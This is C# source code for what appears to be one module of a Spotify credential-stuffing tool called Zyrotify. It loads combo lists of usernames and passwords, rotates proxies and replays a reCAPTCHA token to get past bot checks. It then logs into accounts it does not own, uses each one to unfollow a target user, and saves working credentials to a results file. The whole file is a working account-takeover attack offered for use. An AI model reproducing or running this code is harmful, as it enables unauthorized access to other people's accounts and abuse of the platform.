using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows;

namespace god_checker
{
    internal class CheckerHelper5
    {
        public static int total;

        public static int bad = 0;

        public static int hits = 0;

        public static int premium = 0;

        public static int free = 0;

        public static int uhd = 0;

        public static int hd = 0;

        public static int err = 0;

        public static int check = 0;

        public static int accindex = 0;

        public static List<string> proxies = new List<string>();

        public static string proxytype = "";

        public static int proxyindex = 0;

        public static int proxytotal = 0;

        public static int stop = 0;

        public static List<string> accounts = new List<string>();

        public static int CPM = 0;

        public static int CPM_aux = 0;

        public static int threads;


        public static void LoadCombos(string fileName)
        {
            using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (BufferedStream bufferedStream = new BufferedStream(fileStream))
                {
                    using (StreamReader streamReader = new StreamReader(bufferedStream))
                    {
                        while (streamReader.ReadLine() != null)
                        {
                            CheckerHelper5.total++;
                        }
                    }
                }
            }
        }

        public static void LoadProxies(string fileName)
        {
            using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (BufferedStream bufferedStream = new BufferedStream(fileStream))
                {
                    using (StreamReader streamReader = new StreamReader(bufferedStream))
                    {
                        while (streamReader.ReadLine() != null)
                        {
                            CheckerHelper5.proxytotal++;
                        }
                    }
                }
            }
        }

        public static void UpdateTitle()
        {
            for (; ; )
            {
                CheckerHelper5.CPM = CheckerHelper5.CPM_aux;
                CheckerHelper5.CPM_aux = 0;
                Console.Title = string.Format("Zyrotify | Module: User Unfollower | Checked {0} - Remaining {1} | Hits {2} - Fails {4} - CPM ", new object[]
                {
                        CheckerHelper5.check,
                        CheckerHelper5.total,
                        CheckerHelper5.hits,
                        CheckerHelper5.free,
                        CheckerHelper5.bad,
                        CheckerHelper5.err,
                }) + CheckerHelper5.CPM * 60;
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(@"
                                   
                            ███████▒▓██   ██▓ ██▀███   ▒█████   ████████ ██▓  █████▒▓██   ██▓
                            ▒ ▒ ▒ ▄▀░ ▒██  ██▒▓██ ▒ ██▒▒██▒  ██▒▓  ██▒ ▓▒▓██▒▓██   ▒  ▒██  ██▒
                            ░ ▒ ▄▀▒░   ▒██ ██░▓██ ░▄█ ▒▒██░  ██▒▒ ▓██░ ▒░▒██▒▒████ ░   ▒██ ██░
                              ▄▀▒   ░  ░ ▐██▓░▒██▀▀█▄  ▒██   ██░░ ▓██▓ ░ ░██░░▓█▒  ░   ░ ▐██▓░
                            ▒███████▒  ░ ██▒▓░░██▓ ▒██▒░ ████▓▒░  ▒██▒ ░ ░██░░▒█░      ░ ██▒▓░
                            ░▒▒ ▓░▒░▒   ██▒▒▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░   ▒ ░░   ░▓   ▒ ░       ██▒▒▒ 
                            ░░▒ ▒ ░ ▒ ▓██ ░▒░   ░▒ ░ ▒░  ░ ▒ ▒░     ░     ▒ ░ ░       ▓██ ░▒░ 
                            ░ ░ ░ ░ ░ ▒ ▒ ░░    ░░   ░ ░ ░ ░ ▒    ░       ▒ ░ ░ ░     ▒ ▒ ░░  
                              ░ ░     ░ ░        ░         ░ ░            ░           ░ ░     
                            ░         ░ ░                                             ░ ░   
                                                                    
                                                        
                                                    
                                    
                ");
                // Check Info
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("[");
                Console.ForegroundColor = ConsoleColor.Blue;
                Console.Write(">>>");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("] Module : ");
                Console.ForegroundColor = ConsoleColor.Blue;
                Console.Write("User Unfollower");
                Console.WriteLine("");
                Console.WriteLine("");

                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("[");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write(">>>");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("] CPM : ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write(CheckerHelper5.CPM * 60);
                Console.WriteLine("");

                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("[");
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.Write(">>>");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("] Error : ");
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.Write(CheckerHelper5.err);
                Console.WriteLine("");

                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("[");
                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                Console.Write(">>>");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("] Checked / Total : ");
                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                Console.Write(CheckerHelper5.check); Console.Write(" / "); Console.Write(CheckerHelper5.total);
                Console.WriteLine("");


                Console.WriteLine("");

                // HIT Stats

                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("[");
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write(">>>");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("] FOLLOWED : ");
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(CheckerHelper5.hits);


                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("[");
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write(">>>");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("] BAN : ");
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine(CheckerHelper5.free);

                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("[");
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write(">>>");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("] BADS : ");
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine(CheckerHelper5.bad);

                Console.WriteLine("");

                Thread.Sleep(1000);
            }
        }

        public static void Check()
        {
            for (; ; )
            {
                if (CheckerHelper5.proxyindex > CheckerHelper5.proxies.Count<string>() - 2)
                {
                    CheckerHelper5.proxyindex = 0;
                }
                try
                {
                    Interlocked.Increment(ref CheckerHelper5.proxyindex);
                    using (HttpRequest req = new HttpRequest())
                    {
                        if (CheckerHelper5.accindex >= CheckerHelper5.accounts.Count<string>())
                        {
                            CheckerHelper5.stop++;
                            break;
                        }
                        Interlocked.Increment(ref CheckerHelper5.accindex);
                        string[] array = CheckerHelper5.accounts[CheckerHelper5.accindex].Split(new char[]
                        {
                            ':',
                            ';',
                            '|'
                        });
                        string text = array[0] + ":" + array[1];
                        try
                        {
                            if (CheckerHelper5.proxytype == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(CheckerHelper5.proxies[CheckerHelper5.proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                            }
                            if (CheckerHelper5.proxytype == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(CheckerHelper5.proxies[CheckerHelper5.proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                            }
                            if (CheckerHelper5.proxytype == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(CheckerHelper5.proxies[CheckerHelper5.proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                            }
                            if (CheckerHelper5.proxytype == "PROXYLESS")
                            {
                                req.Proxy = null;
                            }
                            if (CheckerHelper5.check >= CheckerHelper5.total)
                            {
                                break;
                            }
                            string captcha1 = req.Get("https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&v=iSHzt4kCrNgSxGUYDFqaZAL9&size=invisible&cb=q7o50gyglw4p", null).ToString();
                            string Token = captcha1.Substring("id=\"recaptcha-token\" value=\"", "\"");
                            string post = "v=iSHzt4kCrNgSxGUYDFqaZAL9&reason=q&c=" + Token + "&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&size=invisible&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!q62grYxHRvVxjUIjSFNd0mlvrZ-iCgIHAAAB6FcAAAANnAkBySdqTJGFRK7SirleWAwPVhv9-XwP8ugGSTJJgQ46-0IMBKN8HUnfPqm4sCefwxOOEURND35prc9DJYG0pbmg_jD18qC0c-lQzuPsOtUhHTtfv3--SVCcRvJWZ0V3cia65HGfUys0e1K-IZoArlxM9qZfUMXJKAFuWqZiBn-Qi8VnDqI2rRnAQcIB8Wra6xWzmFbRR2NZqF7lDPKZ0_SZBEc99_49j07ISW4X65sMHL139EARIOipdsj5js5JyM19a2TCZJtAu4XL1h0ZLfomM8KDHkcl_b0L-jW9cvAe2K2uQXKRPzruAvtjdhMdODzVWU5VawKhpmi2NCKAiCRUlJW5lToYkR_X-07AqFLY6qi4ZbJ_sSrD7fCNNYFKmLfAaxPwPmp5Dgei7KKvEQmeUEZwTQAS1p2gaBmt6SCOgId3QBfF_robIkJMcXFzj7R0G-s8rwGUSc8EQzT_DCe9SZsJyobu3Ps0-YK-W3MPWk6a69o618zPSIIQtSCor9w_oUYTLiptaBAEY03NWINhc1mmiYu2Yz5apkW_KbAp3HD3G0bhzcCIYZOGZxyJ44HdGsCJ-7ZFTcEAUST-aLbS-YN1AyuC7ClFO86CMICVDg6aIDyCJyIcaJXiN-bN5xQD_NixaXatJy9Mx1XEnU4Q7E_KISDJfKUhDktK5LMqBJa-x1EIOcY99E-eyry7crf3-Hax3Uj-e-euzRwLxn2VB1Uki8nqJQVYUgcjlVXQhj1X7tx4jzUb0yB1TPU9uMBtZLRvMCRKvFdnn77HgYs5bwOo2mRECiFButgigKXaaJup6NM4KRUevhaDtnD6aJ8ZWQZTXz_OJ74a_OvPK9eD1_5pTG2tUyYNSyz-alhvHdMt5_MAdI3op4ZmcvBQBV9VC2JLjphDuTW8eW_nuK9hN17zin6vjEL8YIm_MekB_dIUK3T1Nbyqmyzigy-Lg8tRL6jSinzdwOTc9hS5SCsPjMeiblc65aJC8AKmA5i80f-6Eg4BT305UeXKI3QwhI3ZJyyQAJTata41FoOXl3EF9Pyy8diYFK2G-CS8lxEpV7jcRYduz4tEPeCpBxU4O_KtM2iv4STkwO4Z_-c-fMLlYu9H7jiFnk6Yh8XlPE__3q0FHIBFf15zVSZ3qroshYiHBMxM5BVQBOExbjoEdYKx4-m9c23K3suA2sCkxHytptG-6yhHJR3EyWwSRTY7OpX_yvhbFri0vgchw7U6ujyoXeCXS9N4oOoGYpS5OyFyRPLxJH7yjXOG2Play5HJ91LL6J6qg1iY8MIq9XQtiVZHadVpZVlz3iKcX4vXcQ3rv_qQwhntObGXPAGJWEel5OiJ1App7mWy961q3mPg9aDEp9VLKU5yDDw1xf6tOFMwg2Q-PNDaKXAyP_FOkxOjnu8dPhuKGut6cJr449BKDwbnA9BOomcVSztEzHGU6HPXXyNdZbfA6D12f5lWxX2B_pobw3a1gFLnO6mWaNRuK1zfzZcfGTYMATf6d7sj9RcKNS230XPHWGaMlLmNxsgXkEN7a9PwsSVwcKdHg_HU4vYdRX6vkEauOIwVPs4dS7yZXmtvbDaX1zOU4ZYWg0T42sT3nIIl9M2EeFS5Rqms_YzNp8J-YtRz1h5RhtTTNcA5jX4N-xDEVx-vD36bZVzfoMSL2k85PKv7pQGLH-0a3DsR0pePCTBWNORK0g_RZCU_H898-nT1syGzNKWGoPCstWPRvpL9cnHRPM1ZKemRn0nPVm9Bgo0ksuUijgXc5yyrf5K49UU2J5JgFYpSp7aMGOUb1ibrj2sr-D63d61DtzFJ2mwrLm_KHBiN_ECpVhDsRvHe5iOx_APHtImevOUxghtkj-8RJruPgkTVaML2MEDOdL_UYaldeo-5ckZo3VHss7IpLArGOMTEd0bSH8tA8CL8RLQQeSokOMZ79Haxj8yE0EAVZ-k9-O72mmu5I0wH5IPgapNvExeX6O1l3mC4MqLhKPdOZOnTiEBlSrV4ZDH_9fhLUahe5ocZXvXqrud9QGNeTpZsSPeIYubeOC0sOsuqk10sWB7NP-lhifWeDob-IK1JWcgFTytVc99RkZTjUcdG9t8prPlKAagZIsDr1TiX3dy8sXKZ7d9EXQF5P_rHJ8xvmUtCWqbc3V5jL-qe8ANypwHsuva75Q6dtqoBR8vCE5xWgfwB0GzR3Xi_l7KDTsYAQIrDZVyY1UxdzWBwJCrvDrtrNsnt0S7BhBJ4ATCrW5VFPqXyXRiLxHCIv9zgo-NdBZQ4hEXXxMtbem3KgYUB1Rals1bbi8X8MsmselnHfY5LdOseyXWIR2QcrANSAypQUAhwVpsModw7HMdXgV9Uc-HwCMWafOChhBr88tOowqVHttPtwYorYrzriXNRt9LkigESMy1bEDx79CJguitwjQ9IyIEu8quEQb_-7AEXrfDzl_FKgASnnZLrAfZMtgyyddIhBpgAvgR_c8a8Nuro-RGV0aNuunVg8NjL8binz9kgmZvOS38QaP5anf2vgzJ9wC0ZKDg2Ad77dPjBCiCRtVe_dqm7FDA_cS97DkAwVfFawgce1wfWqsrjZvu4k6x3PAUH1UNzQUxVgOGUbqJsaFs3GZIMiI8O6-tZktz8i8oqpr0RjkfUhw_I2szHF3LM20_bFwhtINwg0rZxRTrg4il-_q7jDnVOTqQ7fdgHgiJHZw_OOB7JWoRW6ZlJmx3La8oV93fl1wMGNrpojSR0b6pc8SThsKCUgoY6zajWWa3CesX1ZLUtE7Pfk9eDey3stIWf2acKolZ9fU-gspeACUCN20EhGT-HvBtNBGr_xWk1zVJBgNG29olXCpF26eXNKNCCovsILNDgH06vulDUG_vR5RrGe5LsXksIoTMYsCUitLz4HEehUOd9mWCmLCl00eGRCkwr9EB557lyr7mBK2KPgJkXhNmmPSbDy6hPaQ057zfAd5s_43UBCMtI-aAs5NN4TXHd6IlLwynwc1zsYOQ6z_HARlcMpCV9ac-8eOKsaepgjOAX4YHfg3NekrxA2ynrvwk9U-gCtpxMJ4f1cVx3jExNlIX5LxE46FYIhQ";
                            string captcha2 = req.Post("https://www.google.com/recaptcha/api2/reload?k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39", post, "application/x-www-form-urlencoded").ToString();
                            string Token2 = captcha2.Substring("[\"rresp\",\"", "\"");
                            string csrf = req.Get("https://accounts.spotify.com/en/login", null).Cookies.GetCookies("https://accounts.spotify.com/")["csrf_token"].Value;
                            string deviceid = req.Get("https://accounts.spotify.com/en/login", null).Cookies.GetCookies("https://accounts.spotify.com/")["__Host-device_id"].Value;
                            string secure = req.Get("https://accounts.spotify.com/en/login", null).Cookies.GetCookies("https://accounts.spotify.com/")["__Secure-TPASESSION"].Value;
                            string post2 = "remember=true&continue=https%3A%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&username=" + array[0] + "&password=" + array[1] + "&recaptchaToken=" + Token2 + "&csrf_token=" + csrf + "";
                            req.AddHeader("cookie", "sp_t=576b5e3d-a565-47d4-94ce-0b6748fdc625; _gcl_au=1.1.1585241231.1587921490; sp_adid=fbe3a5fc-d8a3-4bc5-b079-3b1663ce0b49; _scid=5eee3e0e-f16b-4f4c-bf73-188861f9fb0c; _hjid=fb8648d2-549b-44c8-93e9-5bf00116b906; _fbp=fb.1.1587921496365.773542932; __Host-device_id=" + deviceid + "; cookieNotice=true; sp_m=us; spot=%7B%22t%22%3A1596548261%2C%22m%22%3A%22us%22%2C%22p%22%3Anull%7D; sp_last_utm=%7B%22utm_campaign%22%3A%22alwayson_eu_uk_performancemarketing_core_brand%2Bcontextual-desktop%2Btext%2Bexact%2Buk-en%2Bgoogle%22%2C%22utm_medium%22%3A%22paidsearch%22%2C%22utm_source%22%3A%22uk-en_brand_contextual-desktop_text%22%7D; _gcl_dc=GCL.1596996484.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB; _gcl_aw=GCL.1596996484.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB; _gac_UA-5784146-31=1.1596996518.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB; ki_t=1597938645946%3B1599140931855%3B1599140931855%3B3%3B3; ki_r=; optimizelyEndUserId=oeu1599636139883r0.3283057902318758; optimizelySegments=%7B%226174980032%22%3A%22search%22%2C%226176630028%22%3A%22none%22%2C%226179250069%22%3A%22false%22%2C%226161020302%22%3A%22gc%22%7D; optimizelyBuckets=%7B%7D; sp_landingref=https%3A%2F%2Fwww.google.com%2F; _gid=GA1.2.2046705606.1599636143; _sctr=1|1599634800000; sp_usid=ceb6c24c-d1b4-4895-bcb7-e4e386afd063; sp_ab=%7B%222019_04_premium_menu%22%3A%22control%22%7D; _pin_unauth=dWlkPVlUQXdaV0UyTXprdE1EQmxOaTAwWlRCbUxUbGtNVGN0T0RVeE1ERTVNalEwTnpBMSZycD1abUZzYzJV; __Secure-TPASESSION=" + secure + "; __bon=MHwwfC0yODU4Nzc4NjN8LTEyMDA2ODcwMjQ2fDF8MXwxfDE=; remember=" + array[0] + "; OptanonAlertBoxClosed=2020-09-09T18: 37:10.735Z; OptanonConsent=isIABGlobal=false&datestamp=Wed+Sep+09+2020+11%3A37%3A11+GMT-0700+(Pacific+Daylight+Time)&version=6.5.0&hosts=&consentId=89714584-b320-4c03-bd3c-be011bfaba6d&interactionCount=1&landingPath=NotLandingPage&groups=t00%3A1%2Cs00%3A1%2Cf00%3A1%2Cm00%3A1&AwaitingReconsent=false&geolocation=US%3BNJ; csrf_token=" + csrf + "; _ga_S35RN5WNT2=GS1.1.1599675929.1.1.1599676676.0; _ga=GA1.2.1572440783.1597938634; _gat=1");
                            req.UserAgent = "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36";
                            req.AllowAutoRedirect = true;
                            req.KeepAlive = true;
                            req.IgnoreProtocolErrors = true;
                            req.ConnectTimeout = 5000;
                            req.Cookies = null;
                            req.UseCookies = true;
                            req.AllowAutoRedirect = true;
                            req.AddHeader("sec-fetch-site", "same-origin");
                            req.AddHeader("sec-fetch-mode", "cors");
                            req.AddHeader("sec-fetch-dest", "empty");
                            req.AddHeader("sec-fetch-user", "?1");
                            req.AddHeader("upgrade-insecure-requests", "1");

                            req.Referer = "https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&_locale=en-AE";
                            string giris = req.Post("https://accounts.spotify.com/login/password", post2, "application/x-www-form-urlencoded").ToString();
                            string accesstoken = req.Get("https://open.spotify.com/get_access_token?reason=transport&productType=web_player", null).ToString();
                            string accesstoken2 = accesstoken.Substring("accessToken\":\"", "\"");
                            string yarrak = req.AddHeader("Authorization:", "Bearer " + accesstoken2).ToString();
                            req.Delete("https://api.spotify.com/v1/me/following?type=user&ids=" + Program.alqwe2).ToString();

                            if (giris.Contains("{\"result\":\"ok\",\""))
                            {

                                CheckerHelper5.CPM_aux++;
                                CheckerHelper5.check++;
                                CheckerHelper5.hits++;
                                CheckerHelper5.Good2("Account: " + text);
                            }
                            else if (giris.Contains("{\"error\":\"errorInvalidCredentials\"}"))
                            {
                                CheckerHelper5.CPM_aux++;
                                CheckerHelper5.check++;
                                CheckerHelper5.bad++;
                                CheckerHelper5.Bad2(text);
                            }
                            else if (giris.Contains("{\"error\":\"server_error"))
                            {
                                CheckerHelper5.CPM_aux++;
                                CheckerHelper5.check++;
                                CheckerHelper5.free++;
                                

                            }
                            else
                            {
                                CheckerHelper5.accounts.Add(text);
                            }
                        }
                        catch (Exception)
                        {
                            CheckerHelper5.accounts.Add(text);
                        }
                    }
                    continue;
                }
                catch
                {
                    Interlocked.Increment(ref CheckerHelper5.err);
                }
            }
        }

        public static void Good2(string account)
        {
            try
            {
                using (StreamWriter sw = File.AppendText("results/mailaccess/Good.txt"))
                {
                    sw.WriteLine(account);
                }
            }
            catch
            {

            }
        }
        public static void Bad2(string account)
        {
            try
            {
                using (StreamWriter sw = File.AppendText("results/mailaccess/Bad.txt"))
                {
                    sw.WriteLine(account);
                }
            }
            catch
            {

            }
        }


        public static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}

